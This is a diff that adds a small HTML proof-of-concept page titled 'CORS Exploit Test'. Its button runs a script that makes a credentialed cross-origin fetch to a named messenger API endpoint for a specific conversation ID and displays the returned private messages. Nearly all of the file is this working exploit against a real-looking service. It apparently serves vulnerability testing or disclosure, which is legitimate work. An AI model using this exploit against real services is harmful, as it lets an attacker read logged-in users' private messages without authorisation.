@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h2>CORS Exploit Test</h2>
+  <button onclick="exploit()">Get Messages</button>
+
+  <script>
+    function exploit() {
+      fetch("https://wapi.tevi.app/messenger/v2/rpc/get_messages?conversation_ids=b1445fe7-a557-435b-be5c-c3a369bf1fa9&limit=20&order=created_at", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(response => response.text())
+      .then(data => alert(data))
+      .catch(err => alert("Error: " + err));
+    }
+  </script>
+</body>
+</html>
